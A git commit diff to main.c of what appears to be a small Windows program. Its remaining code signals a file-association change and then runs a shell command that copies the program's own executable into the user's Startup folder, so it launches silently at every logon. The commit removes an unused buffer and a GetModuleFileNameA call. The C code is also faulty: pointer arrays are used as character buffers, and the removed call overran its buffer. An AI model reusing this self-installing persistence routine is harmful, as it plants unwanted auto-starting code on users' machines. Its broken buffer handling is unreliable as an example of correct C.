b4c5aeb012161e6ed54aa1fa9db152b0122ba2e1
Oxygen033 <moormaxim2k4@gmail.com>
2024-02-19 17:45:48 +0600

    cleaned unused code

--- main.c
+++ main.c
@@ -14,9 +14,7 @@ int main(int argc, char* argv[]){
 
     SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_FLUSHNOWAIT, NULL, NULL);
 
-    const char* path[100];
     const char* command[128];
-    GetModuleFileNameA(NULL, path, 128);
     sprintf(command, "copy \"%s\" \"%%USERPROFILE%%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", argv[0]);
     system(command);
     return 0;
